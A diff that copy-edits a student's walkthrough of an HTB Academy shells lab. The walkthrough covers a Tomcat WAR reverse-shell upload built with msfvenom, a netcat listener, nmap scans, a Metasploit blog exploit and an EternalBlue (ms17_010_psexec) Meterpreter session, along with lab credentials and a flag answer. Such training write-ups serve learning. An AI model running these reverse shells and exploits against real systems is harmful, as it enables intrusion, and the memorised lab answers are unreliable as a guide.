@@ -25,21 +25,21 @@ Tasks:
 
 ## Action
 
-Own ip `10.10.14.201`
+Own IP: `10.10.14.201`
 
-Foothold ip: `10.129.204.126`
+Foothold IP: `10.129.204.126`
 
 ### RDP into foothold host
 
 ```shell
 xfreerdp /v:10.129.204.126 /u:htb_student /p:HTB_@cademy_stdnt!
 ```
--> Got RDP Access:
+Got RDP access.
 
 ![alt text](assets/images/image-1.png)
 ![alt text](assets/images/image-2.png)
 
-Found some creds in access-creds.txt on Desktop
+Found credentials in access-creds.txt on the desktop.
 ![](assets/images/image-3.png)
 
 ### 1. Question:
@@ -55,7 +55,7 @@ I found in the result the hostname: SHELLS-WINSVR
 ### 2. Question:
 What is the folder name under C:\Shares\...
 
-For that we make use of the installed firefox instance and connect to the server on 8080 from the foothold.
+To do that, I used the installed Firefox instance and connected to the server on port 8080 from the foothold.
 
 ```shell
 firefox 172.16.1.11
@@ -64,13 +64,13 @@ firefox 172.16.1.11
 Here we find the management overview page of Apache Tomcat:
 ![alt text](../assets/images/1785589397101-image.png)
 
-Via the Manager App to which we can login with one of the found credentials we able to upload a WAR-File and deploy it on a specified path:
+Via the Manager app, which we can log in to with one of the found credentials, we were able to upload a WAR file and deploy it to a specified path:
 ![alt text](../assets/images/1785589346970-image.png)
 
-Now let's generate a WAR-File Payload:
+Now let's generate a WAR-file payload:
 
 
-! Need jsp_shell_reverse_tcp !
+! Need jsp_shell_reverse_tcp.
 
 ```shell
 msfvenom -p java/jsp_shell_reverse_tcp -f war -a x86 LPORT=4444 LHOST=172.16.1.5 -o shell.war
@@ -87,9 +87,9 @@ Saved as: shell.war
 Uploading the war file to test if upload works:
 ![alt text](../assets/images/1785783103831-image.png)
 
-worked!
+It worked!
 
-now let's start a meterpreter listener of the foodhold:
+Now let's start a Meterpreter listener on the foothold:
 
 ```shell
 nc -nlvp 4444
@@ -103,7 +103,7 @@ Microsoft Windows [Version 10.0.17763.2114]
 C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>
 ```
 
-Now opening the C:\Shares directory to get the directory name for the answer 2
+Now opening the C:\Shares directory to get the directory name for answer 2.
 
 ```shell
 C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>cd c:\Shares
@@ -124,14 +124,14 @@ dir
 
 ```
 
-And there we have the answer for Question 2
+And there we have the answer for Question 2.
 
 ---
 
 ### 3. Question:
 *What distribution of Linux is running on Host-2?*
 
-To come to that answer we run an nmap scan via the domain-name
+To answer that, we ran an nmap scan using the domain name
 
 ```shell
 sudo nmap -O blog.inlanefreight.local
@@ -154,7 +154,7 @@ OS detection performed. Please report any incorrect results at https://nmap.org/
 Nmap done: 1 IP address (1 host up) scanned in 5.60 seconds
 ```
 
-Which, at the end, does not provide us much information. We extend the scan to perform a full scan will service scan as this may lead to additional details:
+Which, at the end, does not provide us much information. We extended the scan to perform a full service scan, since this may yield additional details:
 ```shell 
 sudo nmap -sV -O -vv blog.inlanefreight.local
 Starting Nmap 7.92 ( https://nmap.org ) at 2026-08-03 15:09 EDT
@@ -214,13 +214,13 @@ Nmap done: 1 IP address (1 host up) scanned in 21.99 seconds
            Raw packets sent: 1126 (53.818KB) | Rcvd: 1066 (46.086KB)
 ```
 
-Here we can see, that the server is running Ubuntu. With a little help from Google, we figure out that Kernel 5.4 is part of Ubuntu 20.04. The answer is simply "ubuntu"
+Here we can see that the server is running Ubuntu. With a little help from Google, we determined that kernel 5.4 is part of Ubuntu 20.04. The answer is simply "ubuntu."
 
 --- 
 ### 4. Question
 *What language is the shell written in that gets uploaded when using the 50064.rb exploit?*
 
-To figure this out we download the exploit from exploitdb and look at it:
+To figure this out, we downloaded the exploit from exploit-db and examined it:
 
 ```shell
 ##
@@ -368,15 +368,15 @@ end
             
 ```
 
-This looks like PHP code
+This looks like PHP code.
 
 ---
 
 ### 5. Question
-*Exp;oit the blog site and sestablish a shell session with the target OS. Submit the contents of /customscripts/flag.txt*
+*Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt*
 
-We get to exploit it!
-For this we use metasploit as this exploit is already written to be added to msfconsole
+Now we get to exploit it.
+For this we use Metasploit, since this exploit is already written and can be loaded into msfconsole.
 
 ```shell
 
@@ -387,7 +387,7 @@ msfconsole
 msf> reload_all
 msf> search 50064.rb
 msf> use 0
-msf> ... set all options with username and pw from creds file...
+msf> ... set all options with username and password from the creds file...
 # It is important to set the vhost to blog.inlanefreight.local
 
 ```
@@ -396,7 +396,7 @@ Now we have a shell:
 
 ![alt text](../assets/images/1785869954849-image.png)
 
-Moving into the right place and printing out the flag gives us the answer:
+Moving into the right place and printing the flag gives us the answer:
 
 ```shell
 B1nD_Shells_r_cool
@@ -425,7 +425,7 @@ Host script results:
 |   SHELLS-WINBLUE<20>   Flags: <unique><active>
 ```
 
-Provides us the host name "SHELLS-WINBLUE" (...eternalblue?...)
+This gives us the host name "SHELLS-WINBLUE" (...eternalblue?...)
 
 ---
 
@@ -433,7 +433,7 @@ Provides us the host name "SHELLS-WINBLUE" (...eternalblue?...)
 *Exploit and... flag*
 
 ```shell
-# running ms17_010_psexec against the target with setting lhost and rhost
+# running ms17_010_psexec against the target with LHOST and RHOST set
 
 msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 172.16.1.5
 lhost => 172.16.1.5
@@ -451,7 +451,7 @@ msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 [*] Sending stage (175174 bytes) to 172.16.1.13
 [*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2026-08-04 15:45:28 -0400
 
-# Then printing out the flag to get the final answer.
+# Then print out the flag to get the final answer.
 cat C:/Users/Administrator/Desktop/Skills-flag.txt
 
 
